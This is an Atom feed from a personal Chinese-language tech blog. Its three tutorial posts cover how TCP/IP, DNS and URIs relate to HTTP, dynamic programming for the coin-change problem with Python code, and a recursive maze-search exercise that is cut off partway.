<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AdamZeng</title>
  
  <subtitle>start from zero</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://adamzeng.site/"/>
  <updated>2017-11-06T03:53:08.000Z</updated>
  <id>http://adamzeng.site/</id>
  
  <author>
    <name>AdamZeng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TCP/IP与HTTP的关系</title>
    <link href="http://adamzeng.site/2017/11/06/TCP-IP%E4%B8%8EHTTP%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <id>http://adamzeng.site/2017/11/06/TCP-IP与HTTP的关系/</id>
    <published>2017-11-06T02:41:11.000Z</published>
    <updated>2017-11-06T03:53:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>按层次分，IP（Internet Protocol）网际协议位于网络层。Internet Protocol这个名称可能听上去有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到IP协议。TCP/IP协议族中的IP指的就是网际协议，协议名称中占据了一半位置，其重要性可见一斑。可能有人会把“IP”和”IP地址”搞混，”IP”实际是一种协议的名称。<a id="more"></a></p><p>IP协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各种条件。其中两个重要条件是IP地址和MAC地址（Media Access Control Address）。</p><p>IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，但MAC地址基本上不会更改。</p><p>使用ARP协议凭借MAC地址进行通信。</p><p>IP间的通信以来MAC地址。在网络上，通信的双方在同一局域网（LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时，会采用ARP协议（Address Resolution Protocol）。ARP是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。</p><p>没有人能够全面掌握互联网中的传输状况。</p><p>在到达通信目标前的中转过程中，哪些计算机和路由器等网络设备只能获悉很粗略的传输路线。</p><p>这种机制称为路由选择（routing），有点像快递公司的送货过程。想要寄快递的人，只要将自己的货物送到集散中心买就可以知道快递公司是否肯收件发货，该快递公司的集散中心检查货物的送达地址，明确下站该送往哪个区域的集散中心。接着，哪个区域的集散中心自会判断是否能送到对方家中。</p><p>我们是想通过这个比喻说明，无论哪台计算机、哪台网络设备、它们都无法全面掌握互联网中的细节。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8810.56.51.png" alt="image"></p><h3 id="确保可靠性的TCP协议"><a href="#确保可靠性的TCP协议" class="headerlink" title="确保可靠性的TCP协议"></a>确保可靠性的TCP协议</h3><p>按层次分，TCP位于传输层，提供可靠的字节流服务。</p><p>所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，TCP协议为了更容易传送大数据才把数据分割，而且TCP协议能够确认数据最终是否送达到对方。</p><p>确保数据能到达目标</p><p>为了准确无误地将数据送达目标处，TCP协议采用了三次握手（three）way handshaking）策略。用TCP协议把数据包送出去后，TCP不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。</p><p>握手过程中使用了TCP的标志（flag）——SYN    （synchronize）和ACK（acknonwledgement）。</p><p>发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。</p><p>若在握手过程中某个阶段莫名中断,TCP协议会再次以相同的顺序发送相同的数据包。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.17.10.png" alt="image"></p><p>除了上述三次握手，TCP协议还有其他各种手段来保证通信的可靠性。</p><h3 id="负责域名解析的DNS服务"><a href="#负责域名解析的DNS服务" class="headerlink" title="负责域名解析的DNS服务"></a>负责域名解析的DNS服务</h3><p>DNS（Domain Name System）服务是和HTTP协议一样位于应用层的协议。它提供域名到IP地址之间的解析服务。</p><p>计算机既可以被赋予IP地址，也可以被赋予主机名和域名。比如www.hackr.jp.</p><p>用户通常使用主机名或域名来访问对方的计算机，而不是直接通过IP地址访问。因为与IP地址的一组纯数字相比，用字母配合数字表示形式来指定计算机名更符合人类的记忆习惯。</p><p>但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。</p><p>为了解决上述的问题，DNS服务应运而生。DNS协议提供通过域名查找IP地址，或逆向从IP地址反查域名的服务。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.25.22.png" alt="image"></p><h3 id="各种协议与HTTP协议的关系"><a href="#各种协议与HTTP协议的关系" class="headerlink" title="各种协议与HTTP协议的关系"></a>各种协议与HTTP协议的关系</h3><p>学习了和HTTP协议密不可分的TCP/IP协议族中的各种协议后，我们再通过这张图来了解下IP协议、TCP协议和DNS服务在使用HTTP协议的通信过程中各自发挥了哪些作用。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.28.17.png" alt="image"></p><h3 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h3><p>与URI（统一资源标识符）相比，我们更熟悉URL（Uniform Resource Locator，统一资源定位符）。URL正是使用Web浏览器等访问Web页面时需要输入的网页地址。比如，下图的<a href="http://hackr.jp/就是URL。" target="_blank" rel="external">http://hackr.jp/就是URL。</a></p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.35.05.png" alt="image"></p><h3 id="统一资源标识符"><a href="#统一资源标识符" class="headerlink" title="统一资源标识符"></a>统一资源标识符</h3><p>URI是Uniform Resource Identifier的缩写。RFC2396分别对这3个单词进行了如下定义。</p><h4 id="Uniform"><a href="#Uniform" class="headerlink" title="Uniform"></a>Uniform</h4><p>规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如http:或ftp:)也更容易。</p><h4 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h4><p>资源的定义是“可标识的任何东西”。除了文档文件、图像或服务（例如当天的天气预报）等能够区别于其他类型的，全都可作为资源。另外，资源不仅可以是单一的，也可以是多数的集合体。</p><h4 id="Identifier"><a href="#Identifier" class="headerlink" title="Identifier"></a>Identifier</h4><p>表示可标识的对象。也称为标识符。</p><p>综上所述，URI就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。</p><p>采用HTTP协议时，协议方案就是http。除此之外，还有ftp、mailto、telnet、file等。标准的URI协议方案有30种左右，由隶属于国际互联网管理的非营利社团ICANN（Internet Corporation for Assigned Names and  Numbers,互联网名称与数字地址分配机构）的IANA（Internet Assigned Numbers Authority，互联网号码分配局）管理颁布。</p><ul><li><p>IANA-Uniform Resource Identifier（URI）SCHEMES（统一资源标识符方案）</p><p><a href="http://www.iana.org/assignments/uri-schemes" target="_blank" rel="external">http://www.iana.org/assignments/uri-schemes</a></p><p>URI用字符串标识某一互联网资源，而URL表示资源的地点（互联网上所处的位置）。可见URL是URI的子集。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.50.24.png" alt="image"></p><p>​</p><p>​</p></li></ul><p>​    </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;按层次分，IP（Internet Protocol）网际协议位于网络层。Internet Protocol这个名称可能听上去有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到IP协议。TCP/IP协议族中的IP指的就是网际协议，协议名称中占据了一半位置，其重要性可见一斑。可能有人会把“IP”和”IP地址”搞混，”IP”实际是一种协议的名称。
    
    </summary>
    
      <category term="HTTP" scheme="http://adamzeng.site/categories/HTTP/"/>
    
    
      <category term="HTTP" scheme="http://adamzeng.site/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>动态规划</title>
    <link href="http://adamzeng.site/2017/11/05/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>http://adamzeng.site/2017/11/05/动态规划/</id>
    <published>2017-11-05T14:24:58.000Z</published>
    <updated>2017-11-05T15:34:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>计算机科学中的许多程序是为了优化一些值而编写的; 例如，找到两个点之间的最短路径，找到最适合一组点的线，或找到满足某些标准的最小对象集。计算机科学家使用许多策略来解决这些问题。本书的目标之一是向你展示几种不同的解决问题的策略。<code>动态规划</code> 是这些类型的优化问题的一个策略。<a id="more"></a></p><p>优化问题的典型例子包括使用最少的硬币找零。假设你是一个自动售货机制造商的程序员。你的公司希望通过给每个交易最少硬币来简化工作。假设客户放入 1 美元的钞票并购买 37 美分的商品。你可以用来找零的最小数量的硬币是多少？答案是六个硬币：两个 25 美分，一个 10美分 和 三个一美分。我们如何得到六个硬币的答案？我们从最大的硬币（25 美分）开始，并尽可能多，然后我们去找下一个小点的硬币，并尽可能多的使用它们。这第一种方法被称为贪婪方法，因为我们试图尽快解决尽可能大的问题。</p><p>让我们看一个方法，我们可以确定会找到问题的最佳答案。由于这一节是关于递归的，你可能已经猜到我们将使用递归解决方案。让我们从基本情况开始，如果我们可以与我们硬币的价值相同的金额找零，答案很容易，一个硬币。</p><p>如果金额不匹配，我们有几个选项。我们想要的是最低一个一分钱加上原始金额减去一分钱所需的硬币数量，或者一个 5 美分加上原始金额减去 5 美分所需的硬币数量，或者一个 10 美分加上原始金额减去 10 美分所需的硬币数量，等等。因此，需要对原始金额找零硬币数量可以根据下式计算：</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/assets/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.1.png" alt="image"></p><p>执行我们刚才描述的算法如 Listing 7 所示。在第 3 行，我们检查基本情况;也就是说，我们正试图支付硬币的确切金额。如果我们没有等于找零数量的硬币，我们递归调用每个小于找零额的不同的硬币值。第 6 行显示了我们如何使用列表推导将硬币列表过滤到小于当前找零的硬币列表。递归调用也减少了由所选硬币的值所需要的总找零量。递归调用在第 7 行。注意在同一行，我们将硬币数 <code>+1</code> ，以说明我们正在使用一个硬币的事实。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recMC</span><span class="params">(coinValueList,change)</span>:</span></div><div class="line">    minCoins=change</div><div class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c&lt;=change]:</div><div class="line">            numCoins=<span class="number">1</span>+recMC(coinValueList,change-i)</div><div class="line">            <span class="keyword">if</span> numCoins&lt;minCoins:</div><div class="line">                minCoins=numCoins</div><div class="line">    <span class="keyword">return</span> minCoins</div><div class="line">print(recMC([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">25</span>],<span class="number">63</span>))</div></pre></td></tr></table></figure><p><em>Listing 7</em></p><p>Listing 7 中的算法是非常低效的。事实上，它需要 <code>67,716,925</code> 个递归调用来找到 4 个硬币的最佳解决 63 美分问题的方案。要理解我们方法中的致命缺陷，请参见 Figure 5，其中显示了 377 个函数调用所需的一小部分，找到支付 26 美分的最佳硬币。</p><p>图中的每个节点对应于对 <code>recMC</code> 的调用。节点上的标签表示硬币数量的变化量。箭头上的标签表示我们刚刚使用的硬币。通过跟随图表，我们可以看到硬币的组合。主要的问题是我们重复做了太多的计算。例如，该图表示该算法重复计算了至少三次支付 15 美分。这些计算找到 15 美分的最佳硬币数量的步骤本身需要52个函数调用。显然，我们浪费了大量的时间和精力重新计算旧的结果。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/assets/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.figure5.png" alt="image"></p><p>减少我们工作量的关键是记住一些过去的结果，这样我们可以避免重新计算我们已经知道的结果。一个简单的解决方案是将最小数量的硬币的结果存储在表中。然后在计算新的最小值之前，我们首先检查表，看看结果是否已知。如果表中已有结果，我们使用表中的值，而不是重新计算。 ActiveCode 1 显示了一个修改的算法，以合并我们的表查找方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recDC</span><span class="params">(coinValueList,change,knownResults)</span>:</span></div><div class="line">    minCoins=change</div><div class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</div><div class="line">        knownResults[change]=<span class="number">1</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> knownResults[change]&gt;<span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> knownResults[change]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c&lt;=change]:</div><div class="line">            numCoins=<span class="number">1</span>+recDC(coinValueList,change-i,</div><div class="line">                             knownResults)</div><div class="line">            <span class="keyword">if</span> numCoins&lt;minCoins:</div><div class="line">                minCoins=numCoins</div><div class="line">                knownResults[change]=minCoins</div><div class="line">    <span class="keyword">return</span> minCoins</div><div class="line"></div><div class="line">print(recDC([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">25</span>],<span class="number">63</span>,[<span class="number">0</span>]*<span class="number">64</span>))</div></pre></td></tr></table></figure><p><em>ActiveCode 1</em></p><p>注意，在第 6 行中，我们添加了一个测试，看看我们的列表是否包含此找零的最小硬币数量。如果没有，我们递归计算最小值，并将计算出的最小值存储在列表中。使用这个修改的算法减少了我们需要为四个硬币递归调用的数量，63美分问题只需 221 次调用！</p><p>虽然 AcitveCode 1 中的算法是正确的。事实上，我们所做的不是动态规划，而是我们通过使用称为 <code>记忆化</code>的技术来提高我们的程序的性能，或者更常见的叫做 <code>缓存</code>。</p><p>一个真正的动态编程算法将采取更系统的方法来解决这个问题。我们的动态编程解决方案将从找零一分钱开始，并系统地找到我们需要的找零额。这保证我们在算法的每一步，已经知道为任何更小的数量进行找零所需的最小硬币数量。</p><p>让我们看看如何找到 11 美分所需的最小找零数量。Figure 4 说明了该过程。我们从一分钱开始。唯一的解决方案是一个硬币（一分钱）。下一行显示一分和两分的最小值。再次，唯一的解决方案是两分钱。第五行事情变得有趣。现在我们有两个选择，五个一分钱或一个五分钱。我们如何决定哪个是最好的？我们查阅表，看到需要找零四美分的硬币数量是四，再加一个一分钱是五，等于五个硬币。或者我们可以尝试 0 分加一个五分，五分钱等于一个硬币。由于一和五最小的是一，我们在表中存储为一。再次快进到表的末尾，考虑 11 美分。Figure 5 展示了我们要考虑的三个选项：</p><ol><li>一个一分钱加上 <code>11-1 = 10分（1）</code> 的最小硬币数</li><li>一个五分钱加上 <code>11-5 = 6分（2）</code>的最小硬币数</li><li>一个十分钱加上 <code>11-10 = 1 分（1）</code>最小硬币数</li></ol><p>选项 1 或 3 总共需要两个硬币，这是 11 美分的最小硬币数。 </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/assets/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.figure6.png" alt="image"></p><p>Listing 8 用一个动态规划算法来解决我们的找零问题。 <code>dpMakeChange</code> 有三个参数：一个有效硬币值的列表，我们要求的找零额，以及一个包含每个值所需最小硬币数量的列表。 当函数完成时，<code>minCoins</code> 将包含从 0 到找零值的所有值的解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpMakeChange</span><span class="params">(coinValueList,change,minCoins)</span>:</span></div><div class="line">   <span class="keyword">for</span> cents <span class="keyword">in</span> range(change+<span class="number">1</span>):</div><div class="line">      coinCount = cents</div><div class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents]:</div><div class="line">            <span class="keyword">if</span> minCoins[cents-j] + <span class="number">1</span> &lt; coinCount:</div><div class="line">               coinCount = minCoins[cents-j]+<span class="number">1</span></div><div class="line">      minCoins[cents] = coinCount</div><div class="line">   <span class="keyword">return</span> minCoins[change]</div></pre></td></tr></table></figure><p><em>Listing 8</em></p><p>注意，<code>dpMakeChange</code> 不是递归函数，即使我们开始使用递归解决这个问题。重要的是要意识到，你可以为问题写一个递归解决方案但并不意味着它是最好的或最有效的解决方案。在这个函数中的大部分工作是通过从第 4 行开始的循环来完成的。在这个循环中，我们考虑使用所有可能的硬币对指定的金额进行找零。就像我们上面的 11 分的例子，我们记住最小值，并将其存储在我们的 <code>minCoins</code> 列表。</p><p>虽然我们的找零算法很好地找出最小数量的硬币，但它不帮助我们找零，因为我们不跟踪我们使用的硬币。我们可以轻松地扩展 <code>dpMakeChange</code> 来跟踪硬币使用，只需记住我们为每个条目添加的最后一个硬币到 <code>minCoins</code> 表。如果我们知道添加的最后一个硬币值，我们可以简单地减去硬币的值，在表中找到前一个条目，找到该金额的最后一个硬币。我们可以通过表继续跟踪，直到我们开始的位置。</p><p>ActiveCode 2 展示了 <code>dpMakeChange</code> 算法修改为跟踪使用的硬币，以及一个函数 <code>printCoins</code> 通过表打印出使用的每个硬币的值。前两行主要设置要找零的金额，并创建使用的硬币列表。 接下来的两行创建了我们需要存储结果的列表。<code>coinsUsed</code> 是用于找零的硬币的列表，并且 <code>coinCount</code> 是与列表中的位置相对应进行找零的最小硬币数。</p><p>注意，我们打印的硬币直接来自 <code>coinsUsed</code> 数组。对于第一次调用，我们从数组位置 <code>63</code> 开始，然后打印 <code>21</code>。然后我们取 <code>63-21 = 42</code>，看看列表的第 42 个元素。我们再次找到 21 存储在那里。 最后，数组第 21 个元素21 也包含 21，得到三个 21。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpMakeChange</span><span class="params">(coinValueList,change,minCoins,coinsUsed)</span>:</span></div><div class="line">   <span class="keyword">for</span> cents <span class="keyword">in</span> range(change+<span class="number">1</span>):</div><div class="line">      coinCount = cents</div><div class="line">      newCoin = <span class="number">1</span></div><div class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents]:</div><div class="line">            <span class="keyword">if</span> minCoins[cents-j] + <span class="number">1</span> &lt; coinCount:</div><div class="line">               coinCount = minCoins[cents-j]+<span class="number">1</span></div><div class="line">               newCoin = j</div><div class="line">      minCoins[cents] = coinCount</div><div class="line">      coinsUsed[cents] = newCoin</div><div class="line">   <span class="keyword">return</span> minCoins[change]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printCoins</span><span class="params">(coinsUsed,change)</span>:</span></div><div class="line">   coin = change</div><div class="line">   <span class="keyword">while</span> coin &gt; <span class="number">0</span>:</div><div class="line">      thisCoin = coinsUsed[coin]</div><div class="line">      print(thisCoin)</div><div class="line">      coin = coin - thisCoin</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    amnt = <span class="number">63</span></div><div class="line">    clist = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>]</div><div class="line">    coinsUsed = [<span class="number">0</span>]*(amnt+<span class="number">1</span>)</div><div class="line">    coinCount = [<span class="number">0</span>]*(amnt+<span class="number">1</span>)</div><div class="line"></div><div class="line">    print(<span class="string">"Making change for"</span>,amnt,<span class="string">"requires"</span>)</div><div class="line">    print(dpMakeChange(clist,amnt,coinCount,coinsUsed),<span class="string">"coins"</span>)</div><div class="line">    print(<span class="string">"They are:"</span>)</div><div class="line">    printCoins(coinsUsed,amnt)</div><div class="line">    print(<span class="string">"The used list is as follows:"</span>)</div><div class="line">    print(coinsUsed)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure><p><em>AcitveCode 2</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Making change <span class="keyword">for</span> <span class="number">63</span> requires</div><div class="line"><span class="number">3</span> coins</div><div class="line">They are:</div><div class="line"><span class="number">21</span></div><div class="line"><span class="number">21</span></div><div class="line"><span class="number">21</span></div><div class="line">The used list <span class="keyword">is</span> <span class="keyword">as</span> follows:</div><div class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">21</span>]</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;计算机科学中的许多程序是为了优化一些值而编写的; 例如，找到两个点之间的最短路径，找到最适合一组点的线，或找到满足某些标准的最小对象集。计算机科学家使用许多策略来解决这些问题。本书的目标之一是向你展示几种不同的解决问题的策略。&lt;code&gt;动态规划&lt;/code&gt; 是这些类型的优化问题的一个策略。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>探索迷宫</title>
    <link href="http://adamzeng.site/2017/11/05/%E6%8E%A2%E7%B4%A2%E8%BF%B7%E5%AE%AB/"/>
    <id>http://adamzeng.site/2017/11/05/探索迷宫/</id>
    <published>2017-11-05T02:16:22.000Z</published>
    <updated>2017-11-05T14:23:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="探索迷宫"><a href="#探索迷宫" class="headerlink" title="探索迷宫"></a>探索迷宫</h1><p>在这一节中，我们将讨论一个与扩展机器人世界相关的问题：你如何找到自己的迷宫？<a id="more"></a>如果你在你宿舍有一个扫地机器人（不是所有的大学生？）你希望你可以使用你在本节中学到的知识重新给它编程。我们要解决的问题是帮助我们的乌龟在虚拟迷宫中找到出路。迷宫问题的根源于希腊神话有关，传说忒修斯被送入迷宫中以杀死人身牛头怪。忒修斯用了一卷线帮助他找到回去的退路，当他完成杀死野兽的任务。在我们的问题中，我们将假设我们的乌龟在迷宫中间的某处，必须找到出路。看看Figure 2，了解我们将在本节中做什么。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.11.%E6%8E%A2%E7%B4%A2%E8%BF%B7%E5%AE%AB/assets/4.11.%E6%8E%A2%E7%B4%A2%E8%BF%B7%E5%AE%AB.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>为了使问题更容易些，我们假设我们的迷宫被分成“正方形”。迷宫的每个正方形是开放的或被一段墙壁占据。</p><p>乌龟只能通过迷宫的空心方块。 如果乌龟撞到墙上，它必须尝试不同的方向。乌龟将需要一个程序，以找到迷宫的出路。这里是过程：</p><ol><li>从我们的起始位置，我们将首先尝试向北一格，然后从那里递归地尝试我们的程序。</li><li>如果我们通过尝试向北作为第一步没有成功，我们将向南一格，并递归地重复我们的程序。</li><li>如果向南也不行，那么我们将尝试向西一格，并递归地重复我们的程序。</li><li>如果北，南和西都没有成功，则应用程序从当前位置递归向东。</li><li>如果这些方向都没有成功，那么没有办法离开迷宫，我们失败。</li></ol><p>现在，这听起来很容易，但有几个细节先谈谈。假设我们第一步是向北走。按照我们的程序，我们的下一步也将是向北。但如果北面被一堵墙阻挡，我们必须看看程序的下一步，并试着向南。不幸的是，向南使我们回到原来的起点。如果我们从那里再次应用递归过程，我们将又回到向北一格，并陷入无限循环。所以，我们必须有一个策略来记住我们去过哪。在这种情况下，我们假设有一袋面包屑可以撒在我们走过的路上。如果我们沿某个方向迈出一步，发现那个位置上已经有面包屑，我们应该立即后退并尝试程序中的下一个方向。我们看看这个算法的代码，就像从递归函数调用返回一样简单。</p><p>正如我们对所有递归算法所做的一样，让我们回顾一下基本情况。其中一些你可能已经根据前一段的描述猜到了。在这种算法中，有四种基本情况要考虑：</p><ol><li>乌龟撞到了墙。由于这一格被墙壁占据，不能进行进一步的探索。</li><li>乌龟找到一个已经探索过的格。我们不想继续从这个位置探索，否则会陷入循环。</li><li>我们发现了一个外边缘，没有被墙壁占据。换句话说，我们发现了迷宫的一个出口。</li><li>我们探索了一格在四个方向上都没有成功。</li></ol><p>为了我们的程序工作，我们将需要有一种方式来表示迷宫。为了使这个更有趣，我们将使用 <code>turtle</code> 模块来绘制和探索我们的迷宫，以使我们看到这个算法的功能。迷宫对象将提供以下方法让我们在编写搜索算法时使用：</p><ul><li><code>__init__</code> 读取迷宫的数据文件，初始化迷宫的内部表示，并找到乌龟的起始位置。</li><li><code>drawMaze</code> 在屏幕上的一个窗口中绘制迷宫。</li><li><code>updatePosition</code> 更新迷宫的内部表示，并更改窗口中乌龟的位置。</li><li><code>isExit</code> 检查当前位置是否是迷宫的退出位置。</li></ul><p>Maze 类还重载索引运算符 <code>[]</code> ，以便我们的算法可以轻松访问任何特定格的状态。</p><p>让我们来查看称为 <code>searchFrom</code> 的搜索函数的代码。代码如 Listing 3 所示。请注意，此函数需要三个参数：迷宫对象，起始行和起始列。 这很重要，因为作为递归函数，搜索在每次递归调用时开始。</p><p>乌龟只能通过迷宫的空心方块。 